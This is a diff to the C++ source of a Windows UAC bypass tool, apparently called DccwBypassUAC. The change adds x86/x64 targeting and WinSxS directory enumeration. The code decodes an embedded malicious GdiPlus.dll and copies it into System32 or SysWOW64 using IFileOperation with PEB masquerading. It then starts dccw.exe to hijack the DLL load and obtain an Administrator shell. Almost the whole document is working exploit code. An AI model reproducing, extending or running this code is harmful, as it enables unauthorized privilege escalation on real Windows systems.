@@ -3,12 +3,13 @@
 
 #include "stdafx.h"
 #include <stdio.h>
-#include "GdiPlus64.h"
+#include "GdiPlus32.h"
 #include <string>
 #include <Shobjidl.h>
 #include <Windows.h>
 #include <compressapi.h>
 #include <wincrypt.h>
+#include <vector>
 
 #pragma comment(lib, "ws2_32")
 #pragma comment(lib, "crypt32.lib") 
@@ -331,23 +332,60 @@ BOOL base64DecodeAndDecompressDLL(CHAR *buffer, LPCWSTR lpDecFile) {
 	return TRUE;
 }
 
-BOOL createDirectories(LPCTSTR variableDirectory) {
+std::vector <std::wstring> getDirectories(LPCWSTR targetedDirectories) {
+	WIN32_FIND_DATA ffd;
+	std::vector <std::wstring> dirNames;
+	HANDLE hFind = INVALID_HANDLE_VALUE;
+	DWORD dwError = 0;
+	LPCTSTR fixedDirectory = L"dccw.exe.Local";
+
+	hFind = FindFirstFile(targetedDirectories, &ffd);
+	if (INVALID_HANDLE_VALUE == hFind) {
+		wprintf(L" [-] Error! Cannot get the targeted directories!");
+		exit(1);
+	}
+
+	do {
+		if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+			std::wstring slash(L"\\");
+			std::wstring path = fixedDirectory + slash + ffd.cFileName;
+			LPCWSTR finalPath = path.c_str();
+			dirNames.push_back(finalPath);
+		}
+	} while (FindNextFile(hFind, &ffd) != 0);
+
+	dwError = GetLastError();
+	if (dwError != ERROR_NO_MORE_FILES) {
+		wprintf(L" [-] Error! Cannot get the targeted directories!");
+		exit(1);
+	}
+
+	FindClose(hFind);
+
+	return dirNames;
+}
+
+BOOL createDirectories(LPCTSTR targetedDirectories) {
 	BOOL success = TRUE;
 	LPCTSTR fixedDirectory = L"dccw.exe.Local";
+	std::vector <std::wstring> dirNames;
+	dirNames = getDirectories(targetedDirectories);
 
 	if (!CreateDirectory(fixedDirectory, NULL)) {
 		success = FALSE;
 	}
 
-	if(!CreateDirectory(variableDirectory, NULL)) {
-		success = FALSE;
+	for (int i = 0; i < dirNames.size(); i++) {
+		if (!CreateDirectory(dirNames.at(i).c_str(), NULL)) {
+			success = FALSE;
+		}
 	}
-	
+
 	return success;
 }
 
 
-BOOL IFileOperationCopy() {
+BOOL IFileOperationCopy(LPCWSTR destPath) {
 	IFileOperation *fileOperation = NULL;
 	WCHAR dllPath[1024];
 
@@ -369,7 +407,6 @@ BOOL IFileOperationCopy() {
 
 	wprintf(L" [*] Using the IFileOperation::CopyItem method to copy the malicious \"GdiPlus.dll\"...\n");
 
-	LPCWSTR destPath = L"C:\\Windows\\System32";
 	BIND_OPTS3 bo;
 	SHELLEXECUTEINFOW shexec;
 
@@ -415,11 +452,11 @@ BOOL IFileOperationCopy() {
 	return TRUE;
 }
 
-BOOL IFileOperationDelete() {
+BOOL IFileOperationDelete(LPCWSTR destPath) {
 	IFileOperation *fileOperation = NULL;
 
-	std::wstring path;
-	path = L"C:\\Windows\\System32\\dccw.exe.Local";
+	std::wstring directoryName(L"\\dccw.exe.Local");
+	std::wstring path = destPath + directoryName;
 
 	wprintf(L" [*] Using the IFileOperation::DeleteItem method to delete the malicious \"GdiPlus.dll\"...\n");
 
@@ -462,17 +499,26 @@ BOOL IFileOperationDelete() {
 	return TRUE;
 }
 
-BOOL removeFilesAndDirectories() {
+BOOL removeFilesAndDirectories(LPCWSTR targetedDirectories) {
 	BOOL success = TRUE;
 
 	wprintf(L" [*] Removing all the temporal files and folders...\n");
 
-	if (!DeleteFile(L"dccw.exe.Local\\amd64_microsoft.windows.gdiplus_6595b64144ccf1df_1.1.14393.953_none_7300116921188239\\GdiPlus.dll")) {
-		success = FALSE;
+	std::vector <std::wstring> dirNames;
+	dirNames = getDirectories(targetedDirectories);
+	for (int i = 0; i < dirNames.size(); i++) {
+		std::wstring filename(L"\\GdiPlus.dll");
+		std::wstring path = dirNames.at(i) + filename;
+		LPCWSTR finalPath = path.c_str();
+		if (!DeleteFile(finalPath)) {
+			success = FALSE;
+		}
 	}
-	
-	if (RemoveDirectory(L"dccw.exe.Local\\amd64_microsoft.windows.gdiplus_6595b64144ccf1df_1.1.14393.953_none_7300116921188239")) {
-		success = FALSE;
+
+	for (int i = 0; i < dirNames.size(); i++) {
+		if (!RemoveDirectory(dirNames.at(i).c_str())) {
+			success = FALSE;
+		}
 	}
 	
 	if (!RemoveDirectory(L"dccw.exe.Local")) {
@@ -482,48 +528,77 @@ BOOL removeFilesAndDirectories() {
 	return success;
 }
 
-int main() {
-	WIN32_FIND_DATA FindFileData;
-	HANDLE hFind;
-	LPCWSTR dllName = L"C:\\Windows\\System32\\dccw.exe.Local\\amd64_microsoft.windows.gdiplus_6595b64144ccf1df_1.1.14393.953_none_7300116921188239\\GdiPlus.dll";
-	GdiPlus64 gdiplus64;
+int wmain(int argc, wchar_t* argv[]) {
 
-	wprintf(L" [*] Creating temporary folders...\n");
-	if (!createDirectories(L"dccw.exe.Local\\amd64_microsoft.windows.gdiplus_6595b64144ccf1df_1.1.14393.953_none_7300116921188239")) {
-		wprintf(L" [-] Error! Cannot create \"dccw.exe.Local\\amd64_microsoft.windows.gdiplus_6595b64144ccf1df_1.1.14393.953_none_7300116921188239\"!");
-		return 1;
-	}
-	
-	wprintf(L" [*] Extracting the malicious DLL..\n");
-	CHAR *gdiplus = gdiplus64.getEncodedDLL();
-	if (!base64DecodeAndDecompressDLL(gdiplus, L"dccw.exe.Local\\amd64_microsoft.windows.gdiplus_6595b64144ccf1df_1.1.14393.953_none_7300116921188239\\GdiPlus.dll")) {
-		wprintf(L" [-] Error! Cannot extract the malicious DLL!\n");
-		removeFilesAndDirectories();
-		return 1;
-	}
+	if (argc == 2) {
 
-	wprintf(L" [*] Masquerading the PEB...\n");
-	if (!IFileOperationCopy()) {
-		removeFilesAndDirectories();
-		return 1;
-	}
+		WIN32_FIND_DATA FindFileData;
+		HANDLE hFind;
+		LPCWSTR dllName = L"C:\\Windows\\System32\\dccw.exe.Local\\x86_microsoft.windows.gdiplus_6595b64144ccf1df_1.1.14393.953_none_baad48403594ab3f\\GdiPlus.dll";
+		LPCWSTR targetedDirectories = L"C:\\Windows\\WinSxS\\x86_microsoft.windows.gdiplus_*";
+		LPCWSTR destPath;
+		GdiPlus32 gdiplus32;
+		LPWSTR version = CharLower(argv[1]);
 
-	hFind = FindFirstFile(dllName, &FindFileData);
-	if (hFind == INVALID_HANDLE_VALUE) {
-		wprintf(L" [-] Error! The IFileOperation::CopyItem operation has failed!\n");
-		removeFilesAndDirectories();
-		return 1;
+		if (wcscmp(version, L"x86") == 0) {
+			destPath = L"C:\\Windows\\System32";
+		} else if (wcscmp(version, L"x64") == 0) {
+			destPath = L"C:\\Windows\\SysWOW64";
+		} else {
+			wprintf(L" [-] Error! You must specify the target version: \"x86\" or \"x64\".\n");
+			wprintf(L" For example : \n");
+			wprintf(L" > DccwBypassUAC.exe x86\n");
+			return 1;
+		}
+
+		wprintf(L" [*] Creating temporary folders...\n");
+		if (!createDirectories(targetedDirectories)) {
+			wprintf(L" [-] Error! Cannot create the necessary directories!");
+			return 1;
+		}
+
+		wprintf(L" [*] Extracting the malicious DLL..\n");
+		CHAR *gdiplus = gdiplus32.getEncodedDLL();
+		std::vector <std::wstring> dirNames;
+		dirNames = getDirectories(targetedDirectories);
+		for (int i = 0; i < dirNames.size(); i++) {
+			std::wstring filename(L"\\GdiPlus.dll");
+			std::wstring path = dirNames.at(i) + filename;
+			LPCWSTR finalPath = path.c_str();
+			if (!base64DecodeAndDecompressDLL(gdiplus, finalPath)) {
+				wprintf(L" [-] Error! Cannot extract the malicious DLL!\n");
+				removeFilesAndDirectories(targetedDirectories);
+				return 1;
+			}
+		}
+
+		wprintf(L" [*] Masquerading the PEB...\n");
+		if (!IFileOperationCopy(destPath)) {
+			removeFilesAndDirectories(targetedDirectories);
+			return 1;
+		}
+
+		hFind = FindFirstFile(dllName, &FindFileData);
+		if (hFind == INVALID_HANDLE_VALUE) {
+			wprintf(L" [-] Error! The IFileOperation::CopyItem operation has failed!\n");
+			removeFilesAndDirectories(targetedDirectories);
+			return 1;
+		}
+		else {
+			FindClose(hFind);
+		}
+
+		wprintf(L" [*] Starting dccw.exe (cross the fingers and wait to get an Administrator shell)...\n");
+
+		ShellExecute(NULL, NULL, L"C:\\Windows\\System32\\dccw.exe", NULL, NULL, SW_SHOW);
+
+		IFileOperationDelete(destPath);
+		removeFilesAndDirectories(targetedDirectories);
 	} else {
-		FindClose(hFind);
+		wprintf(L" [-] Error! You must specify the target version: \"x86\" or \"x64\".\n");
+		wprintf(L" For example : \n");
+		wprintf(L" > DccwBypassUAC.exe x86\n");
 	}
-
-	wprintf(L" [*] Starting dccw.exe (cross the fingers and wait to get an Administrator shell)...\n");
-
-	ShellExecute(NULL, NULL, L"C:\\Windows\\System32\\dccw.exe", NULL, NULL, SW_SHOW);
-
-	IFileOperationDelete();
-	removeFilesAndDirectories();
-
 	return 0;
 }
 
